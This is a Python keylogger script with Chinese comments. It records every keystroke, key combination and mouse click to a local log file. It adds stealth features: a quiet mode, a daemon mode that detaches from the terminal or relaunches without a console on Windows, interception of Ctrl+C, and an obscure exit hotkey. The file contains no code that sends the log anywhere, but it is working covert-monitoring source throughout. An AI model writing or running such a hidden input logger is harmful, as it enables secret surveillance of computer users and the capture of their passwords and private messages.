#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import signal
import argparse
from datetime import datetime
from pynput import keyboard, mouse

# --------------------------------------------------------------
#   输入记录器
# --------------------------------------------------------------
class InputLogger:
    """键盘/鼠标记录器（quiet、daemon、组合键、防重复、热键退出）"""

    EXIT_HOTKEY = {"<ctrl>", "<shift>", "<alt>", "<f12>"}

    # 把 Ctrl+A~Z 映射成普通字母（便于控制字符显示）
    _CTRL_CHAR_MAP = {i: chr(i + 96) for i in range(1, 27)}   # 1->a … 26->z
    _CTRL_CHAR_MAP.update({
        0:   "space", 9: "tab", 10: "enter", 13: "enter",
        27: "esc", 8: "backspace", 127: "del"
    })

    # 小键盘映射表（vk → 可读文字）
    _NUMPAD_MAP = {
        96:  "数字键盘 0", 97:  "数字键盘 1", 98:  "数字键盘 2",
        99:  "数字键盘 3", 100: "数字键盘 4", 101: "数字键盘 5",
        102: "数字键盘 6", 103: "数字键盘 7", 104: "数字键盘 8",
        105: "数字键盘 9", 106: "数字键盘 *", 107: "数字键盘 +",
        108: "数字键盘 Enter", 109: "数字键盘 -",
        110: "数字键盘 .", 111: "数字键盘 /"
    }

    def __init__(self, quiet: bool = False):
        self.log_file = "input_log.txt"
        self.pressed_keys = set()
        self.kb_listener = None
        self.ms_listener = None
        self.quiet = quiet

    # ---------- 写日志 ----------
    def write_log(self, message: str):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"{ts} - {message}"
        if not self.quiet:          # 只在非 quiet 模式下打印
            print(line)
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    # ---------- 统一键名 ----------
    def normalize_key(self, key) -> str:
        """
        返回统一的键名：
        - 小键盘 → “数字键盘 0” … “数字键盘 .”
        - 可打印字符 → 原字符
        - Ctrl+A~Z → 对应小写字母（如 'a')
        - 修饰键 → <ctrl>, <alt>, <shift>, <cmd>
        - 其它功能键 → <f1>, <left> …
        """
        # 小键盘
        if isinstance(key, keyboard.KeyCode):
            vk = getattr(key, "vk", None)
            if vk is not None and vk in self._NUMPAD_MAP:
                return self._NUMPAD_MAP[vk]

        # 普通字符（包括空格）
        try:
            ch = key.char
            if ch is not None:
                if ord(ch) >= 32:               # 正常可打印
                    return ch
                # 控制字符（Ctrl+A …）映射为普通小写字母或其它提示
                mapped = self._CTRL_CHAR_MAP.get(ord(ch))
                if mapped is not None:
                    return mapped
                return f"ctrl+{ord(ch)}"
        except AttributeError:
            pass

        # 其它键统一为 <…>
        name = str(key).replace("Key.", "").lower()
        if name.startswith("ctrl"):
            return "<ctrl>"
        if name.startswith("alt"):
            return "<alt>"
        if name.startswith("shift"):
            return "<shift>"
        if name.startswith("cmd") or name.startswith("win"):
            return "<cmd>"
        return f"<{name}>"

    # ---------- 检查退出热键 ----------
    def check_exit_hotkey(self):
        if self.EXIT_HOTKEY.issubset(self.pressed_keys):
            self.write_log("检测到退出热键 Ctrl+Shift+Alt+F12，程序即将结束")
            if self.kb_listener:
                self.kb_listener.stop()
            if self.ms_listener:
                self.ms_listener.stop()
            sys.exit(0)

    # ---------- 键盘按下 ----------
    def on_key_press(self, key):
        key_name = self.normalize_key(key)

        # 防止键重复（长按会产生多次 press）
        if key_name in self.pressed_keys:
            return
        self.pressed_keys.add(key_name)

        # 检查退出热键
        self.check_exit_hotkey()

        # 组合键显示（如果有修饰键则拼出组合键）
        modifiers = [m for m in ("<ctrl>", "<alt>", "<shift>", "<cmd>")
                     if m in self.pressed_keys]

        # 若当前键本身是修饰键，只记录一次 “Key 按下: <ctrl>”
        if key_name in ("<ctrl>", "<alt>", "<shift>", "<cmd>"):
            self.write_log(f"Key 按下: {key_name}")
            return

        if modifiers:
            combo = "+".join([m.strip("<>") for m in modifiers] + [key_name])
            self.write_log(f"组合键: {combo}")
        else:
            self.write_log(f"Key 按下: {key_name}")

    # ---------- 键盘松开 ----------
    def on_key_release(self, key):
        key_name = self.normalize_key(key)
        if key_name in self.pressed_keys:
            self.pressed_keys.remove(key_name)
            self.write_log(f"Key 松开: {key_name}")

    # ---------- 鼠标 ----------
    def on_click(self, x, y, button, pressed):
        btn = str(button).replace("Button.", "").lower()
        act = "按下" if pressed else "松开"
        self.write_log(f"Mouse: {btn} {act}")

    # ---------- 日志文件搬迁 ----------
    def rotate_log(self):
        old = "input_log.txt"
        backup = "input_log2.txt"
        if os.path.exists(old):
            if os.path.exists(backup):
                try:
                    os.remove(backup)
                except OSError as e:
                    self.write_log(f"删除旧备份失败: {e}")
            try:
                os.rename(old, backup)
                self.write_log(f"已把 {old} 重命名为 {backup}")
            except OSError as e:
                self.write_log(f"重命名日志文件失败: {e}")

    # ---------- 程序启动 ----------
    def start_logging(self):
        self.rotate_log()
        self.write_log("程序启动")

        self.kb_listener = keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release,
        )
        self.ms_listener = mouse.Listener(on_click=self.on_click)

        self.kb_listener.start()
        self.ms_listener.start()

        try:
            self.kb_listener.join()
            self.ms_listener.join()
        except KeyboardInterrupt:
            self.write_log("捕获到 KeyboardInterrupt，程序结束")
            self.kb_listener.stop()
            self.ms_listener.stop()
            sys.exit(0)


# --------------------------------------------------------------
#   进程脱离终端（daemon）实现
# --------------------------------------------------------------
def daemonize_unix():
    """
    Unix 系统的最小化 daemon 实现（两次 fork，关闭 std fd）。
    只在检测到 --daemon 参数且平台是 posix 时调用。
    """
    # 第一次 fork，父进程退出，子进程脱离终端
    if os.fork() > 0:
        sys.exit(0)

    os.setsid()                     # 创建新会话，脱离控制终端
    # 第二次 fork，防止子进程重新获取控制终端
    if os.fork() > 0:
        sys.exit(0)

    # 将标准IO全部指向 /dev/null（因为我们已经是 quiet 模式）
    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull, 'rb', 0) as devnull:
        os.dup2(devnull.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'ab', 0) as devnull:
        os.dup2(devnull.fileno(), sys.stdout.fileno())
        os.dup2(devnull.fileno(), sys.stderr.fileno())


def launch_windows_daemon(script_path, args_without_daemon):
    """
    在 Windows 上模拟 daemon：使用 pythonw.exe（无控制台）重新启动本脚本，
    然后父进程立即退出。
    """
    # 把 python.exe 改成 pythonw.exe（若不存在则退回普通 python）
    pythonw = os.path.splitext(sys.executable)[0] + "w.exe"
    if not os.path.isfile(pythonw):
        pythonw = sys.executable

    import subprocess
    # `creationflags=subprocess.CREATE_NEW_PROCESS_GROUP` 防止父进程的 Ctrl+Break 干扰子进程
    subprocess.Popen([pythonw, script_path] + args_without_daemon,
                     creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                     close_fds=True)
    # 父进程直接退出
    sys.exit(0)


# --------------------------------------------------------------
#   入口 & 参数解析
# --------------------------------------------------------------
def ignore_sigint(signum, frame):
    """拦截 Ctrl+C（SIGINT）防止意外退出，若想立即退出改成 sys.exit(0)"""
    print("\n收到 SIGINT（Ctrl+C），已拦截，继续运行…")
    # pass          # 直接忽略
    # sys.exit(0)   # 若想让 Ctrl+C 直接退出，取消注释此行


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=(
            "键盘/鼠标记录器\n"
            "-q / --quiet      : 不在终端打印日志，只写文件\n"
            "-d / --daemon     : 把程序脱离终端、后台运行（Linux/macOS/Windows）\n"
        )
    )
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="不在终端打印日志，只写入文件")
    parser.add_argument("-d", "--daemon", action="store_true",
                        help="后台运行（脱离终端）")
    args = parser.parse_args()

    # --------------------------------------------------
    # ① 如果要求 daemon，先根据平台做相应的脱离终端操作
    # --------------------------------------------------
    if args.daemon:
        if os.name == "posix":          # Linux / macOS
            daemonize_unix()
        elif os.name == "nt":          # Windows
            # 把 --daemon 参数剔除后，用 pythonw.exe 重新启动
            filtered = [a for a in sys.argv[1:] if a not in ("-d", "--daemon")]
            launch_windows_daemon(sys.argv[0], filtered)
        # 子进程（已脱离终端）会从这里继续执行

    # --------------------------------------------------
    # ② 把 SIGINT 拦截（可选）
    # --------------------------------------------------
    signal.signal(signal.SIGINT, ignore_sigint)

    # --------------------------------------------------
    # ③ 启动记录器
    # --------------------------------------------------
    logger = InputLogger(quiet=args.quiet)
    logger.start_logging()
